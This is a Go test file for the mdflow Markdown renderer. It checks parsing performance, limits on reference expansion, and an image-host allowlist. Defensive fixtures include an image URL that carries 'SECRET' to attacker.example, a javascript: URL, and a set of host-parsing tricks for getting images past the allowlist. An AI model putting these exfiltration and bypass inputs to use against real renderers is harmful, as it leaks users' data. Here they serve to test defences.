package mdflow_test

import (
	"strings"
	"testing"
	"time"

	"github.com/Wenrh2004/mdflow"
	"github.com/Wenrh2004/mdflow/renderer/html"
)

// Deeply nested list items whose remainder looks like a thematic break
// candidate (`- - - … x`) used to rescan the remainder at every level, so time
// grew with the square of the nesting depth. The test compares growth rather
// than absolute time: quadrupling the input should roughly quadruple the work
// (quadratic would be sixteen-fold), a ratio that survives slow machines.
// Each size takes the fastest of three runs to shed scheduler noise.
func TestNestedListMarkersAreLinear(t *testing.T) {
	if testing.Short() {
		t.Skip("allocates large documents")
	}
	if raceEnabled {
		t.Skip("the race detector's overhead does not scale linearly; ratios mean nothing under it")
	}
	md := mdflow.New()
	fastest := func(src string) time.Duration {
		best := time.Duration(1<<63 - 1)
		for range 3 {
			start := time.Now()
			md.HTML(src)
			best = min(best, time.Since(start))
		}
		return best
	}
	const n = 20_000
	for _, marker := range []string{"- ", "* ", "_ "} {
		small := fastest(strings.Repeat(marker, n) + "x\n")
		large := fastest(strings.Repeat(marker, 4*n) + "x\n")
		if ratio := float64(large) / float64(small); ratio > 8 {
			t.Errorf("%q: 4x the nesting took %.1fx the time (%v -> %v); want linear growth", marker, ratio, small, large)
		}
	}
}

// A long definition referenced many times must not multiply into output far
// larger than the input: expansion past the budget renders as literal text.
func TestReferenceExpansionIsBounded(t *testing.T) {
	src := "[x]: /" + strings.Repeat("a", 50_000) + "\n\n" + strings.Repeat("[x]", 5_000) + "\n"
	out := mdflow.New().HTML(src)
	if limit := 4*len(src) + 400_000; len(out) > limit {
		t.Fatalf("output %d bytes from %d bytes of input; want <= %d", len(out), len(src), limit)
	}
	if !strings.Contains(out, `<a href="/aaa`) {
		t.Fatal("references within the budget must still resolve")
	}
	if !strings.Contains(out, "[x]") {
		t.Fatal("references past the budget must render as literal text")
	}
}

// Ordinary documents stay well inside the budget and resolve every reference.
func TestReferenceBudgetLeavesOrdinaryDocumentsAlone(t *testing.T) {
	src := strings.Repeat("See [the docs][d] and [the docs][d].\n\n", 2_000) + "[d]: https://example.com/docs\n"
	out := mdflow.New().HTML(src)
	if got, want := strings.Count(out, `<a href="https://example.com/docs">`), 4_000; got != want {
		t.Fatalf("resolved %d references, want %d", got, want)
	}
}

func TestURLPolicyRefusesImagesButKeepsText(t *testing.T) {
	md := mdflow.New(mdflow.WithURLPolicy(html.AllowImageHosts("cdn.example.com", "*.trusted.example")))
	cases := []struct{ in, want string }{
		{"![secret](https://attacker.example/?q=SECRET)", "<p>secret</p>\n"},
		{"![a](//attacker.example/x.png)", "<p>a</p>\n"},
		{"![a](data:image/png;base64,AAAA)", "<p>a</p>\n"},
		{"![a](https://cdn.example.com/x.png)", `<p><img src="https://cdn.example.com/x.png" alt="a" /></p>` + "\n"},
		{"![a](https://CDN.example.com:8443/x.png)", `<p><img src="https://CDN.example.com:8443/x.png" alt="a" /></p>` + "\n"},
		{"![a](https://img.trusted.example/x.png)", `<p><img src="https://img.trusted.example/x.png" alt="a" /></p>` + "\n"},
		{"![a](/local.png)", `<p><img src="/local.png" alt="a" /></p>` + "\n"},
		{"[link](https://attacker.example/)", `<p><a href="https://attacker.example/">link</a></p>` + "\n"},
	}
	for _, c := range cases {
		if got := md.HTML(c.in); got != c.want {
			t.Errorf("HTML(%q)\n got: %q\nwant: %q", c.in, got, c.want)
		}
	}
}

func TestURLPolicyRewritesAndRefusesLinks(t *testing.T) {
	md := mdflow.New(mdflow.WithURLPolicy(func(kind html.URLKind, dest string) (string, bool) {
		if kind == html.LinkURL && strings.HasPrefix(dest, "https://") {
			return "https://redirect.example/?to=" + dest, true
		}
		return "", false
	}))
	if got, want := md.HTML("[a](https://x.example/)"), `<p><a href="https://redirect.example/?to=https://x.example/">a</a></p>`+"\n"; got != want {
		t.Errorf("rewrite: got %q want %q", got, want)
	}
	if got, want := md.HTML("[a](http://x.example/)"), `<p><a href="">a</a></p>`+"\n"; got != want {
		t.Errorf("refuse: got %q want %q", got, want)
	}
}

// With SafeLinks a refused image is not emitted as <img src="">, which some
// browsers resolve to the current page and fetch.
func TestSafeLinksRefusedImageRendersAltText(t *testing.T) {
	got := mdflow.New(mdflow.WithSafeLinks()).HTML("![alt](javascript:alert(1))")
	if want := "<p>alt</p>\n"; got != want {
		t.Fatalf("got %q want %q", got, want)
	}
}

// The image allowlist must read hosts the way a browser does, not the way
// net/url does: backslashes, missing or extra slashes, userinfo, ports,
// whitespace and case tricks must not smuggle an image past it.
func TestAllowImageHostsFollowsBrowserParsing(t *testing.T) {
	allow := html.AllowImageHosts("cdn.example.com")
	refused := []string{
		`https:\\attacker.example/x.png`,
		`https:/\attacker.example/x.png`,
		`https:attacker.example/x.png`,
		`\\attacker.example/x.png`,
		`/\attacker.example/x.png`,
		"https://cdn.example.com@attacker.example/x.png",
		"https://attacker.example#cdn.example.com",
		"https://cdn.example.com.attacker.example/x.png",
		"  https://attacker.example/x.png",
		"ht\ttps://attacker.example/x.png",
		"https://attacker%2eexample/x.png",
		"ftp://cdn.example.com/x.png",
		"javascript:alert(1)",
		"data:image/png;base64,AAAA",
		"https:///",
	}
	for _, dest := range refused {
		if _, ok := allow(html.ImageURL, dest); ok {
			t.Errorf("allowed %q", dest)
		}
	}
	allowed := []string{
		"https://cdn.example.com/x.png",
		"HTTPS://CDN.EXAMPLE.COM/x.png",
		"https://cdn.example.com./x.png",
		"http://user@cdn.example.com:8080/x.png",
		`https:\\cdn.example.com\x.png`,
		"//cdn.example.com/x.png",
		"/local/x.png",
		"x.png",
		"?q=1",
	}
	for _, dest := range allowed {
		if _, ok := allow(html.ImageURL, dest); !ok {
			t.Errorf("refused %q", dest)
		}
	}
}
